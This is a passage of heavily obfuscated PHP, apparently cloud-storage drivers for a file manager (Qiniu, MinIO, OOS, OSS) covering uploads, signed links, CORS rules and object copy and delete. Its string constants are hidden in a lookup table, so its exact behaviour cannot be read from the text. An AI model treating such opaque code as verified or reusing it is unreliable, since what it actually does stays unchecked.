$b’„ªÚ´¼ + $b¦ê¯ÈÒ«§ - 1; $c¯îáà¯å¡ = array($Bˆ¨Ï¨°–[1332] . $b’„ªÚ´¼ . $Bˆ¨Ï¨°–[455] . $F…¬‡§õÇß); } $f°×ê©¹ = url_request($E§ËÚ—Íá, $Bˆ¨Ï¨°–[228], !1, $c¯îáà¯å¡); return $f°×ê©¹[$Bˆ¨Ï¨°–[734]] ? $f°×ê©¹[$Bˆ¨Ï¨°–[1112]] : !1; } public function upload($f«’Á‚ø¹¬, $dî¢Ëù½¦, $CºÄ”†ƒ³ë = false, $Fš•ÊÆ¤˜Œ = REPEAT_REPLACE) { $BãšÕò¶‰ = new Qiniu\Storage\UploadManager(); $C°á•öƒŸ = $this->auth->uploadToken($this->bucket, $f«’Á‚ø¹¬); $F†¾É—´À‚ = get_file_mime(get_path_ext($dî¢Ëù½¦)); list($f¾‰¬½ƒ§‹, $dåÓõÀÁ«ö) = $BãšÕò¶‰->putFile($C°á•öƒŸ, $f«’Á‚ø¹¬, $dî¢Ëù½¦, null, $F†¾É—´À‚); return $dåÓõÀÁ«ö ? !1 : $this->getPathOuter($f«’Á‚ø¹¬); } public function uploadFormData($C„ÓÑ”ø˜Ø, $aŠÏØØƒÖÂ = 3600) { return $this->uploadToken($C„ÓÑ”ø˜Ø, $aŠÏØØƒÖÂ); } public function multiUploadFormData($fİ÷Æ‹Ñë», $C†âïÅ‚±³ = 3600) { return $this->uploadToken($fİ÷Æ‹Ñë», $C†âïÅ‚±³); } private function uploadToken($f·Ş¢‰ñµ¨, $b’ï†õò¿Ï = 3600) { goto EÀ–¯ãºÃ; B•“èŞª„: $B­ÊöŠ‚êÛ = http_type() . "\72\x2f\57\x75\x70\154\x6f\x61\x64{$cõÒµ·Ó±ã}\x2e\161\151\156\x69\165\160\x2e\x63\x6f\x6d\57"; return array($AŒì»‡ˆù„[1336] => $béÍ£Òöáá, $AŒì»‡ˆù„[1337] => $B­ÊöŠ‚êÛ); goto cƒ˜¢¹Í‘Ğ; EÀ–¯ãºÃ: $AŒì»‡ˆù„ =& $_SERVER[›èö’ù¤]; $AÜ™ïïÊœ‘ = $b’ï†õò¿Ï; $fğÄÍƒ‹î™ = array($AŒì»‡ˆù„[1333] => $AŒì»‡ˆù„[1334]); goto E¼ªâª°…Ç; E¼ªâª°…Ç: $Cøá¾Ä¨—´ = $f·Ş¢‰ñµ¨; $béÍ£Òöáá = $this->auth->uploadToken($this->bucket, $Cøá¾Ä¨—´, $AÜ™ïïÊœ‘, $fğÄÍƒ‹î™, !0); $cõÒµ·Ó±ã = empty($this->region) || $this->region == $AŒì»‡ˆù„[1335] ? $AŒì»‡ˆù„[33] : $AŒì»‡ˆù„[455] . $this->region; goto B•“èŞª„; cƒ˜¢¹Í‘Ğ: } public function download($E ©òŸÒŒà, $A»‘º§åˆ) { goto Bƒ§Û÷˜õõ; Bƒ§Û÷˜õõ: $dƒÍ´Ü = IO::getPathInner(IO::mkfile($A»‘º§åˆ)); if (!($EÀÓ£ïÇ˜³ = $this->link($E ©òŸÒŒà))) { return !1; } $F‡İéÎ¡èÅ = 0; goto BáÊÉ÷À‡; BáÊÉ÷À‡: $CÙÜàœ˜å“ = 1024 * 200; $d†ëñ»¤ë† = fopen($dƒÍ´Ü, $_SERVER[›èö’ù¤][1338]); while (!0) { $b—‘­Š·› = $this->fileSubstr($E ©òŸÒŒà, $F‡İéÎ¡èÅ, $CÙÜàœ˜å“); if ($b—‘­Š·› === !1) { return !1; } fwrite($d†ëñ»¤ë†, $b—‘­Š·›); $F‡İéÎ¡èÅ += $CÙÜàœ˜å“; if (strlen($b—‘­Š·›) < $CÙÜàœ˜å“) { break; } } goto a«©¸ã÷º; a«©¸ã÷º: fclose($d†ëñ»¤ë†); return $A»‘º§åˆ; goto bø¿ÄˆáŠˆ; bø¿ÄˆáŠˆ: } public function link($cŠ×ñäãÉù, $Eá¶Û§ˆ¤ = '') { if (!$this->isFile($cŠ×ñäãÉù)) { return !1; } $bî†ÇËóŞ = $this->getHost() . $_SERVER[›èö’ù¤][8] . $this->pathEncode($cŠ×ñäãÉù) . $Eá¶Û§ˆ¤; return $this->auth->privateDownloadUrl($bî†ÇËóŞ, 3600 * 12); } public function fileOut($Cİ‘»µ±˜, $c½è³ÒÜÔÉ = false, $bÁ‚ÜÂ´Í = false, $D‘ÕŠºé„ = '') { $fŒ¡“ÂÇ =& $_SERVER[›èö’ù¤]; if ($this->isFileOutServer()) { return $this->fileOutServer($Cİ‘»µ±˜, $c½è³ÒÜÔÉ, $bÁ‚ÜÂ´Í, $D‘ÕŠºé„); } if (!$bÁ‚ÜÂ´Í) { $bÁ‚ÜÂ´Í = $this->pathThis($Cİ‘»µ±˜); } $b†ŠÊ´œ“³ = $c½è³ÒÜÔÉ ? $fŒ¡“ÂÇ[1339] . rawurlencode($bÁ‚ÜÂ´Í) : $fŒ¡“ÂÇ[33]; $DŸšÖÙ­†µ = $this->link($Cİ‘»µ±˜, $b†ŠÊ´œ“³); $this->fileOutLink($DŸšÖÙ­†µ); } public function fileOutServer($aĞ›êšñÜ, $B„Šíêç = false, $f®¨ˆÕ¢ = false, $dÕôÒ³ŸÍ˜ = '') { parent::fileOut($aĞ›êšñÜ, $B„Šíêç, $f®¨ˆÕ¢, $dÕôÒ³ŸÍ˜); } public function fileOutImage($eƒŞ•ÈŒÌ¦, $DŞ’Ï‹Îš = 250) { $BÓ‹…»õÌ = $this->link($eƒŞ•ÈŒÌ¦, $_SERVER[›èö’ù¤][1340] . $DŞ’Ï‹Îš); $this->fileOutLink($BÓ‹…»õÌ); } public function fileOutImageServer($BÉ‘¦òºÎ, $e¥šƒ¤”Ö‰ = 250) { parent::fileOutImage($BÉ‘¦òºÎ, $e¥šƒ¤”Ö‰); } public function hashMd5($B»¶¸òÊÌ) { $Fë…¹Õö÷è =& $_SERVER[›èö’ù¤]; $f¡¡Î±» = $this->objectMeta($B»¶¸òÊÌ); return isset($f¡¡Î±»[$Fë…¹Õö÷è[208]]) ? $f¡¡Î±»[$Fë…¹Õö÷è[208]] : !1; $A†ø”‹»Ä¿ = $this->link($B»¶¸òÊÌ, $Fë…¹Õö÷è[1341]); } public function size($f¥ÖŞÈ’ä—) { $BÄ½‘Á×“Â = $this->objectMeta($f¥ÖŞÈ’ä—); return $BÄ½‘Á×“Â ? $BÄ½‘Á×“Â[$_SERVER[›èö’ù¤][78]] : 0; } public function info($aíËÚñ´È¼) { if ($this->isFolder($aíËÚñ´È¼)) { return $this->folderInfo($aíËÚñ´È¼); } else { if ($this->isFile($aíËÚñ´È¼)) { return $this->fileInfo($aíËÚñ´È¼); } } return !1; } public function exist($BàƒÙ‰œçÔ) { return $this->isFile($BàƒÙ‰œçÔ) || $this->isFolder($BàƒÙ‰œçÔ); } public function isFile($dÃ·øŒ¡‰) { return !$this->isFolder($dÃ·øŒ¡‰) && $this->objectMeta($dÃ·øŒ¡‰); } public function isFolder($b®°Ÿ‰†¬Ş) { return $this->cacheMethod($_SERVER[›èö’ù¤][199], $b®°Ÿ‰†¬Ş); } protected function objectMeta($aÄ‹ÚåŞ©©) { return $this->cacheMethod($_SERVER[›èö’ù¤][200], $aÄ‹ÚåŞ©©); } protected function _objectMeta($a”œÄš¹Ÿİ) { $EÕÒ’Ú°–¹ =& $_SERVER[›èö’ù¤]; list($a¨ó¡£„Ü, $B»¥óîÉ”Ó) = $this->bucketManager->stat($this->bucket, $a”œÄš¹Ÿİ); if ($a¨ó¡£„Ü) { $a¨ó¡£„Ü[$EÕÒ’Ú°–¹[78]] = intval($a¨ó¡£„Ü[$EÕÒ’Ú°–¹[1327]]); } return $a¨ó¡£„Ü; } protected function _isFolder($E‘“°Ìèåï) { $e–ŠŠ¿¦Ø¤ =& $_SERVER[›èö’ù¤]; if ($E‘“°Ìèåï == $e–ŠŠ¿¦Ø¤[33] || $E‘“°Ìèåï == $e–ŠŠ¿¦Ø¤[8]) { return !0; } list($D¥Æ¶–˜½Ã, $d¿Ô ê»ç¨) = $this->bucketManager->listFiles($this->bucket, trim($E‘“°Ìèåï, $e–ŠŠ¿¦Ø¤[8]) . $e–ŠŠ¿¦Ø¤[8], $e–ŠŠ¿¦Ø¤[33], 1, $e–ŠŠ¿¦Ø¤[8]); return !empty($D¥Æ¶–˜½Ã[$e–ŠŠ¿¦Ø¤[1330]]) || !empty($D¥Æ¶–˜½Ã[$e–ŠŠ¿¦Ø¤[1331]]) ? !0 : !1; } } $Aôù«ÈÙ“ = $_SERVER[$_SERVER[›èö’ù¤][832]]; $A®‘‡ÆŒÚ® = $_SERVER[›èö’ù¤][864]; goto C’·Ô˜§; EÃè—¨ìëŠ: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($B¶ßå¸ô¶¾) { parent::__construct($B¶ßå¸ô¶¾); $this->signatureVersion($_SERVER[›èö’ù¤][212]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($CœëàÓ²Éù) { parent::__construct($CœëàÓ²Éù); $this->signatureVersion($_SERVER[›èö’ù¤][212]); } public function fileOutLink($Fİ¸â‰µ) { $bÒ´¸é•‘‘ =& $_SERVER[›èö’ù¤]; if (substr($Fİ¸â‰µ, 0, 7) == $bÒ´¸é•‘‘[1228]) { $Fİ¸â‰µ = $bÒ´¸é•‘‘[1229] . substr($Fİ¸â‰µ, 7); } header($bÒ´¸é•‘‘[159] . $Fİ¸â‰µ); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($FˆÓŸŠÙÊ„) { parent::__construct(); include_once SDK_DIR . $_SERVER[›èö’ù¤][1284]; $this->_init($FˆÓŸŠÙÊ„); } public function _init($b¡ÜæÍ›ä“) { $BØô±‡İÆ =& $_SERVER[›èö’ù¤]; foreach ($b¡ÜæÍ›ä“ as $A´àëöÅÇ« => $aá¥‚í®Ò) { if (isset($this->{$A´àëöÅÇ«})) { $this->{$A´àëöÅÇ«} = $aá¥‚í®Ò; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($BØô±‡İÆ[1285] . LNG($BØô±‡İÆ[1286])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto c‹âäÃÜ¢¼; bËñòòÀ„: $A›¯—³İŸ„->addAllowedOrigin($AÔáÍŞƒŞ[1287]); $A›¯—³İŸ„->addAllowedMethod($AÔáÍŞƒŞ[1288]); $A›¯—³İŸ„->addAllowedMethod($AÔáÍŞƒŞ[1289]); goto dŸ‡ò«¶; a¤¨¸³ë­: $A›¯—³İŸ„->setMaxAgeSeconds(600); $A›¯—³İŸ„->addExposeHeader($AÔáÍŞƒŞ[1292]); $A›¯—³İŸ„->addAllowedHeader($AÔáÍŞƒŞ[1287]); goto B„ì…è‰¤´; B„ì…è‰¤´: $CåÊ¶Éµ“Ş->addRule($A›¯—³İŸ„); try { $this->client->putBucketCors($this->bucket, $CåÊ¶Éµ“Ş); } catch (OSS\Core\OssException $B­È½æò÷‡) { return !1; } return !0; goto cƒ–ˆäôÜ£; c‹âäÃÜ¢¼: $AÔáÍŞƒŞ =& $_SERVER[›èö’ù¤]; $CåÊ¶Éµ“Ş = new OSS\Model\CorsConfig(); $A›¯—³İŸ„ = new OSS\Model\CorsRule(); goto bËñòòÀ„; dŸ‡ò«¶: $A›¯—³İŸ„->addAllowedMethod($AÔáÍŞƒŞ[1290]); $A›¯—³İŸ„->addAllowedMethod($AÔáÍŞƒŞ[1291]); $A›¯—³İŸ„->addAllowedMethod($AÔáÍŞƒŞ[158]); goto a¤¨¸³ë­; cƒ–ˆäôÜ£: } public function getBucketCors() { goto f’ù¬¬‰°; C¦æù¿ñò: return array($f÷àêÍÔ¬[181] => isset($céé°‰Ê´ì[0]) ? $céé°‰Ê´ì[0] : $f÷àêÍÔ¬[33], $f÷àêÍÔ¬[185] => $BÜ™ŠŒš±, $f÷àêÍÔ¬[1293] => $AË‰ÛÍˆ­Õ, $f÷àêÍÔ¬[1294] => isset($dæè®ò†¡´[0]) ? $dæè®ò†¡´[0] : $f÷àêÍÔ¬[33], $f÷àêÍÔ¬[183] => isset($A–¯Š±¢…¢[0]) ? $A–¯Š±¢…¢[0] : $f÷àêÍÔ¬[33]); goto cœ¨®¹¨õ; cä¬ÕìêÃá: if (!$b àŸŸ¸½“ || !($A™ÑÈãØÁä = $b àŸŸ¸½“->getRules())) { return null; } $céé°‰Ê´ì = $A™ÑÈãØÁä[0]->getAllowedOrigins(); $BÜ™ŠŒš± = $A™ÑÈãØÁä[0]->getAllowedMethods(); goto cê©ßÕåê; cê©ßÕåê: $AË‰ÛÍˆ­Õ = $A™ÑÈãØÁä[0]->getMaxAgeSeconds(); $dæè®ò†¡´ = $A™ÑÈãØÁä[0]->getExposeHeaders(); $A–¯Š±¢…¢ = $A™ÑÈãØÁä[0]->getAllowedHeaders(); goto C¦æù¿ñò; f’ù¬¬‰°: $f÷àêÍÔ¬ =& $_SERVER[›èö’ù¤]; $b àŸŸ¸½“ = null; try { $b àŸŸ¸½“ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $bäŞùÆºÁ) { return null; } goto cä¬ÕìêÃá; cœ¨®¹¨õ: } public function isBucketCors() { goto dµööùÑô; A®§ã¡¸ò¨: if ($CêªÖñ²àã[$A÷®‹Å¼»İ[181]] != $A÷®‹Å¼»İ[182] || $CêªÖñ²àã[$A÷®‹Å¼»İ[183]] != $A÷®‹Å¼»İ[182]) { return !1; } $eëš’¡‹¬ = array_map($A÷®‹Å¼»İ[184], $CêªÖñ²àã[$A÷®‹Å¼»İ[185]]); if (!is_array($eëš’¡‹¬)) { $eëš’¡‹¬ = array(); } goto a—¦ ¬Ã—; a—¦ ¬Ã—: $C×Ç‹Ë†á = array($A÷®‹Å¼»İ[186], $A÷®‹Å¼»İ[187], $A÷®‹Å¼»İ[188], $A÷®‹Å¼»İ[189], $A÷®‹Å¼»İ[190]); $EÄëØ¤ºÄ = array_diff($C×Ç‹Ë†á, $eëš’¡‹¬); return empty($EÄëØ¤ºÄ); goto BŒÓÚÖ¥àÚ; dµööùÑô: $A÷®‹Å¼»İ =& $_SERVER[›èö’ù¤]; $CêªÖñ²àã = $this->getBucketCors(); if (!$CêªÖñ²àã || !is_array($CêªÖñ²àã)) { return !1; } goto A®§ã¡¸ò¨; BŒÓÚÖ¥àÚ: } public function mkfile($CğİåİõŠ, $F¢¹ÇÎÉ = '', $a†äµ×Äİæ = REPEAT_RENAME) { $Aƒ³–Ğ—İ = $this->setContent($CğİåİõŠ, $F¢¹ÇÎÉ); if ($Aƒ³–Ğ—İ !== !1) { return $this->getPathOuter($CğİåİõŠ); } return !1; } public function mkdir($cë‡¼š­Àª, $FÍ‘¯à·×Ç = REPEAT_SKIP) { if ($this->_isFolder($cë‡¼š­Àª)) { return $this->getPathOuter($cë‡¼š­Àª); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($cë‡¼š­Àª)); } catch (OSS\Core\OssException $Dƒè‡Óßã) { return !1; } return $this->getPathOuter($cë‡¼š­Àª); } private function fileList($bÇ¤§®ÎË, $cåëñœ¡¼¹ = '', $bë®Æç½Ğí = 0) { goto dÌÓìé®¥–; E„„œÆáâ: $AÔÓ„Õ÷Š = $eñîÚ‚£æ„ = array(); while (!0) { check_abort(); $F‘‡ñ¬†ÕÄ = array($F¨Ÿé÷×œ[1295] => $cåëñœ¡¼¹, $F¨Ÿé÷×œ[1296] => $cŠä×ÙÆ«÷, $F¨Ÿé÷×œ[1297] => $F†õ©ôÖ“, $F¨Ÿé÷×œ[1298] => $A¸¹Æ®–Õ); try { $AÙ¦Ñ©Åö = $this->client->listObjects($this->bucket, $F‘‡ñ¬†ÕÄ); } catch (OSS\Core\OssException $f”Ş¹„îÔ‡) { break; } $A¸¹Æ®–Õ = $AÙ¦Ñ©Åö->getNextMarker(); $aÇÕá§¬ªé = $AÙ¦Ñ©Åö->getObjectList(); $B—ùøÓâÆ = $AÙ¦Ñ©Åö->getPrefixList(); foreach ($aÇÕá§¬ªé as $e¥„ƒÕ†¹) { goto c²«ÌëÕ‹Š; a†„…ÚÊ°‚: if ($aôëç«ö›Õ) { $this->cacheMethod($F¨Ÿé÷×œ[199], $AŠË´¡¯É, $fêÔ¼ï¤Ô); $this->cacheMethod($F¨Ÿé÷×œ[200], $AŠË´¡¯É, array($F¨Ÿé÷×œ[78] => $dòù·­«Â§, $F¨Ÿé÷×œ[1299] => $dòù·­«Â§, $F¨Ÿé÷×œ[84] => strtotime($dà­‘ìé‘Ñ), $F¨Ÿé÷×œ[1300] => $dà­‘ìé‘Ñ)); } if ($fêÔ¼ï¤Ô) { $AÔÓ„Õ÷Š[] = $AŠË´¡¯É; continue; } $eñîÚ‚£æ„[] = $f‚˜ÂñïÆ¢; goto D‚İ÷‚ßé®; E– Ä†°‚: $dà­‘ìé‘Ñ = $e¥„ƒÕ†¹->getLastModified(); $f‚˜ÂñïÆ¢ = $bë®Æç½Ğí ? array($F¨Ÿé÷×œ[28] => $AŠË´¡¯É, $F¨Ÿé÷×œ[78] => $dòù·­«Â§, $F¨Ÿé÷×œ[197] => strtotime($dà­‘ìé‘Ñ)) : $AŠË´¡¯É; $fêÔ¼ï¤Ô = $dòù·­«Â§ == 0 && substr($AŠË´¡¯É, strlen($AŠË´¡¯É) - 1, 1) == $F¨Ÿé÷×œ[8] ? !0 : !1; goto a†„…ÚÊ°‚; c²«ÌëÕ‹Š: if ($e¥„ƒÕ†¹->getKey() == $cŠä×ÙÆ«÷) { continue; } $AŠË´¡¯É = $e¥„ƒÕ†¹->getKey(); $dòù·­«Â§ = $e¥„ƒÕ†¹->getSize(); goto E– Ä†°‚; D‚İ÷‚ßé®: } foreach ($B—ùøÓâÆ as $dŒ¢¬Àˆ) { $AÔÓ„Õ÷Š[] = $dŒ¢¬Àˆ->getPrefix(); if ($aôëç«ö›Õ) { $this->cacheMethod($F¨Ÿé÷×œ[199], $AŠË´¡¯É, !0); } } if ($A¸¹Æ®–Õ === $F¨Ÿé÷×œ[33]) { break; } } if ($aôëç«ö›Õ) { $this->cacheMethod($F¨Ÿé÷×œ[199], $bÇ¤§®ÎË, !0); } goto C¸Û—´÷±µ; dÌÓìé®¥–: $F¨Ÿé÷×œ =& $_SERVER[›èö’ù¤]; $bÇ¤§®ÎË = trim($bÇ¤§®ÎË, $F¨Ÿé÷×œ[8]); $cŠä×ÙÆ«÷ = empty($bÇ¤§®ÎË) && $bÇ¤§®ÎË !== $F¨Ÿé÷×œ[191] ? $F¨Ÿé÷×œ[33] : $bÇ¤§®ÎË . $F¨Ÿé÷×œ[8]; goto f¯¦‹ŠÎŠà; C¸Û—´÷±µ: return array($F¨Ÿé÷×œ[75] => $AÔÓ„Õ÷Š, $F¨Ÿé÷×œ[74] => $eñîÚ‚£æ„); goto Fˆ¬ñÁƒ; f¯¦‹ŠÎŠà: $A¸¹Æ®–Õ = $F¨Ÿé÷×œ[33]; $F†õ©ôÖ“ = 1000; $aôëç«ö›Õ = $this->listItemCache === !1 ? !1 : !0; goto E„„œÆáâ; Fˆ¬ñÁƒ: } public function copyFile($e¹ïğ¾Çå, $d¯íÏ‚Ÿø) { $F¶íâæ‡ = $this->size($e¹ïğ¾Çå); if ($F¶íâæ‡ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $e¹ïğ¾Çå, $this->bucket, $this->pathEncode($d¯íÏ‚Ÿø)); } catch (OSS\Core\OssException $E á¾‡³ÏÉ) { return !1; } return $this->getPathOuter($d¯íÏ‚Ÿø); } $BíÂ÷«Æ‰ = $this->multiCopyObject($e¹ïğ¾Çå, $d¯íÏ‚Ÿø, $F¶íâæ‡); return $BíÂ÷«Æ‰ ? $this->getPathOuter($d¯íÏ‚Ÿø) : !1; } private function multiCopyObject($A÷ƒ¾†ˆ÷, $dè›ÎºÚ¸Ï, $dÎ¯™ì‰Œë) { $Cˆ‹î¿ñ =& $_SERVER[›èö’ù¤]; try { goto BŞŒÅÅî‚Ş; BŞŒÅÅî‚Ş: $AéãÓø™Úº = array(); if ($bĞƒÂ°‰¤‡ = $this->hashMd5($A÷ƒ¾†ˆ÷)) { $AéãÓø™Úº = array(OSS\OssClient::OSS_HEADERS => array($Cˆ‹î¿ñ[1301] => $bĞƒÂ°‰¤‡)); } $D›‡ö»»À¿ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($dè›ÎºÚ¸Ï), $AéãÓø™Úº); goto B†øìŠ‡‹Š; aìòµ„¿‰«: $E¥°…¸‰­ = array(); foreach ($F÷‰Îôè¿ as $cñ¼¸‹‚·ø => $Fï…Ï˜µŸ¥) { $E¥°…¸‰­[] = array($Cˆ‹î¿ñ[1305] => $cñ¼¸‹‚·ø + 1, $Cˆ‹î¿ñ[1306] => $Fï…Ï˜µŸ¥); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($dè›ÎºÚ¸Ï), $D›‡ö»»À¿, $E¥°…¸‰­); goto a‰øñ•ø•ï; DÛÆî«ÂÈ¥: $a¤‹§¢·ßÄ = 1024 * 1024 * 10; $e®Ùì¶íİª = $this->client->generateMultiuploadParts($dÎ¯™ì‰Œë, $a¤‹§¢·ßÄ); foreach ($e®Ùì¶íİª as $cñ¼¸‹‚·ø => $CßÈ¬¨¢éˆ) { $Då·Èƒƒ—’ = $c´ˆî†°‹‡ + (int) $CßÈ¬¨¢éˆ[$Cˆ‹î¿ñ[1302]]; $Föæ ÷ˆĞ = (int) $CßÈ¬¨¢éˆ[$Cˆ‹î¿ñ[335]] + $Då·Èƒƒ—’ - 1; $B…ÊŠ’Îƒ = array($Cˆ‹î¿ñ[1303] => $Då·Èƒƒ—’, $Cˆ‹î¿ñ[1304] => $Föæ ÷ˆĞ); $F÷‰Îôè¿[] = $this->client->uploadPartCopy($this->bucket, $A÷ƒ¾†ˆ÷, $this->bucket, $this->pathEncode($dè›ÎºÚ¸Ï), $Fò…èĞù·Œ, $D›‡ö»»À¿, $B…ÊŠ’Îƒ); $Fò…èĞù·Œ = $Fò…èĞù·Œ + 1; } goto aìòµ„¿‰«; B†øìŠ‡‹Š: $Fò…èĞù·Œ = 1; $c´ˆî†°‹‡ = 0; $F÷‰Îôè¿ = array(); goto DÛÆî«ÂÈ¥; a‰øñ•ø•ï: } catch (OSS\Core\OssException $dë‡¹ŞØ‚) { return !1; } return !0; } public function moveFile($C“¤Ú¤£™, $cÙÌ´®Ä¼“) { if ($this->copyFile($C“¤Ú¤£™, $cÙÌ´®Ä¼“)) { $this->remove($C“¤Ú¤£™); return $this->getPathOuter($cÙÌ´®Ä¼“); } return !1; } public function delFile($BÅÌ…ôĞÙš) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($BÅÌ…ôĞÙš)); } catch (OSS\Core\OssException $F¾œ¡ïÑ¿) { return !1; } return !0; } public function delFolder($D¦ğÄâ†Ÿç) { goto f£èÏÎ‡‚¨; bŸãĞô¾Ú: if (!empty($D¦ğÄâ†Ÿç) && $D¦ğÄâ†Ÿç !== $B­ƒœÄîğ[191] && !in_array($EáÁß˜˜¦¼, $F‰‹Æ®æ‘¨[$B­ƒœÄîğ[75]])) { $F‰‹Æ®æ‘¨[$B­ƒœÄîğ[75]][] = $EáÁß˜˜¦¼; } $A¥ÔÖàÕŞ¢ = $this->delByBatch($F‰‹Æ®æ‘¨[$B­ƒœÄîğ[74]]); if (!$A¥ÔÖàÕŞ¢) { return !1; } goto Cƒ²Æ˜¥; Cƒ²Æ˜¥: $A¥ÔÖàÕŞ¢ = $this->delByBatch($F‰‹Æ®æ‘¨[$B­ƒœÄîğ[75]]); if (!$A¥ÔÖàÕŞ¢) { return !1; } return $this->delFile($EáÁß˜˜¦¼); goto F×É²é¯Ëñ; f£èÏÎ‡‚¨: $B­ƒœÄîğ =& $_SERVER[›èö’ù¤]; if (!$this->exist($D¦ğÄâ†Ÿç)) { return !0; } $this->listItemCache = !1; goto E¦öªìšĞŞ; E¦öªìšĞŞ: $F‰‹Æ®æ‘¨ = $this->fileList($D¦ğÄâ†Ÿç); $this->listItemCache = !0; $EáÁß˜˜¦¼ = trim($D¦ğÄâ†Ÿç, $B­ƒœÄîğ[8]) . $B­ƒœÄîğ[8]; goto bŸãĞô¾Ú; F×É²é¯Ëñ: } private function delByBatch($E…óÇÂèõ˜) { foreach (array_chunk($E…óÇÂèõ˜, 1000) as $a§Ï®¸•ºÑ) { try { $this->client->deleteObjects($this->bucket, $a§Ï®¸•ºÑ); } catch (OSS\Core\OssException $C–‹ê’ùÂ×) { return !1; } } return !0; } public function rename($b×‡Éì¥–Ë, $añ¼â¥Ñ¹ğ) { return $this->renameObject($b×‡Éì¥–Ë, $añ¼â¥Ñ¹ğ); } private function fileInfo($d¿ËÔİ¹„°, $c½®øÊ¹¨õ = false, $C®ĞÌ…±¤ = array()) { goto eªêàÅ¶ìŠ; eÈ†³¸ƒƒ: if (isset($C®ĞÌ…±¤[$FÔ…ïÁË¶[78]])) { $Cíİ‘ÜÀÉ´[$FÔ…ïÁË¶[78]] = $C®ĞÌ…±¤[$FÔ…ïÁË¶[78]]; } if (isset($C®ĞÌ…±¤[$FÔ…ïÁË¶[84]])) { $Cíİ‘ÜÀÉ´[$FÔ…ïÁË¶[84]] = $C®ĞÌ…±¤[$FÔ…ïÁË¶[84]]; } if (isset($C®ĞÌ…±¤[$FÔ…ïÁË¶[197]]) && !trim($Cíİ‘ÜÀÉ´[$FÔ…ïÁË¶[84]])) { $Cíİ‘ÜÀÉ´[$FÔ…ïÁË¶[84]] = $C®ĞÌ…±¤[$FÔ…ïÁË¶[197]]; } goto E‹Ò‡—À¤Û; E‹Ò‡—À¤Û: return $Cíİ‘ÜÀÉ´; goto dÙ¾”Èƒô; eªêàÅ¶ìŠ: $FÔ…ïÁË¶ =& $_SERVER[›èö’ù¤]; $Cíİ‘ÜÀÉ´ = array($FÔ…ïÁË¶[28] => $this->pathThis($d¿ËÔİ¹„°), $FÔ…ïÁË¶[76] => $this->getPathOuter($d¿ËÔİ¹„°), $FÔ…ïÁË¶[29] => $FÔ…ïÁË¶[193], $FÔ…ïÁË¶[78] => isset($C®ĞÌ…±¤[$FÔ…ïÁË¶[78]]) ? $C®ĞÌ…±¤[$FÔ…ïÁË¶[78]] : 0, $FÔ…ïÁË¶[168] => $this->ext($d¿ËÔİ¹„°)); if ($c½®øÊ¹¨õ) { return $Cíİ‘ÜÀÉ´; } goto fê†äî³èä; fê†äî³èä: $Cíİ‘ÜÀÉ´[$FÔ…ïÁË¶[194]] = $Cíİ‘ÜÀÉ´[$FÔ…ïÁË¶[84]] = 0; $Cíİ‘ÜÀÉ´[$FÔ…ïÁË¶[195]] = $Cíİ‘ÜÀÉ´[$FÔ…ïÁË¶[196]] = !0; if (empty($C®ĞÌ…±¤)) { $dŒÏÏ‘¢± = $this->objectMeta($d¿ËÔİ¹„°); if (!$dŒÏÏ‘¢±) { return $Cíİ‘ÜÀÉ´; } $C®ĞÌ…±¤ = array($FÔ…ïÁË¶[84] => strtotime($dŒÏÏ‘¢±[$FÔ…ïÁË¶[1300]]), $FÔ…ïÁË¶[78] => $dŒÏÏ‘¢±[$FÔ…ïÁË¶[1299]] + 0); } goto eÈ†³¸ƒƒ; dÙ¾”Èƒô: } private function folderInfo($c“ª˜ãÏß°, $E±‰Óó = false, $fòÅ“Ï™‘» = array()) { goto Bˆ¢ÅßÖ—ï; Eºäß§·ã: if (isset($fòÅ“Ï™‘»[$dÈ—ô¼Ö¿ˆ[84]])) { $E¼à¤Ÿ[$dÈ—ô¼Ö¿ˆ[84]] = $fòÅ“Ï™‘»[$dÈ—ô¼Ö¿ˆ[84]]; } if (isset($fòÅ“Ï™‘»[$dÈ—ô¼Ö¿ˆ[194]])) { $E¼à¤Ÿ[$dÈ—ô¼Ö¿ˆ[194]] = $fòÅ“Ï™‘»[$dÈ—ô¼Ö¿ˆ[194]]; } return $E¼à¤Ÿ; goto f¼°Í‚‚È’; D¦‚ù”œ¸­: $E¼à¤Ÿ[$dÈ—ô¼Ö¿ˆ[194]] = $E¼à¤Ÿ[$dÈ—ô¼Ö¿ˆ[84]] = 0; $E¼à¤Ÿ[$dÈ—ô¼Ö¿ˆ[195]] = $E¼à¤Ÿ[$dÈ—ô¼Ö¿ˆ[196]] = !0; if (empty($fòÅ“Ï™‘»)) { $c“ª˜ãÏß° = rtrim($c“ª˜ãÏß°, $dÈ—ô¼Ö¿ˆ[8]) . $dÈ—ô¼Ö¿ˆ[8]; $BÕ™Åä–²˜ = $this->objectMeta($c“ª˜ãÏß°); if (!$BÕ™Åä–²˜) { return $E¼à¤Ÿ; } $fòÅ“Ï™‘» = array($dÈ—ô¼Ö¿ˆ[194] => $BÕ™Åä–²˜[$dÈ—ô¼Ö¿ˆ[506]][$dÈ—ô¼Ö¿ˆ[1307]], $dÈ—ô¼Ö¿ˆ[84] => strtotime($BÕ™Åä–²˜[$dÈ—ô¼Ö¿ˆ[1300]])); } goto Eºäß§·ã; Bˆ¢ÅßÖ—ï: $dÈ—ô¼Ö¿ˆ =& $_SERVER[›èö’ù¤]; $E¼à¤Ÿ = array($dÈ—ô¼Ö¿ˆ[28] => $this->pathThis($c“ª˜ãÏß°), $dÈ—ô¼Ö¿ˆ[76] => $this->getPathOuter($dÈ—ô¼Ö¿ˆ[8] . $c“ª˜ãÏß°), $dÈ—ô¼Ö¿ˆ[29] => 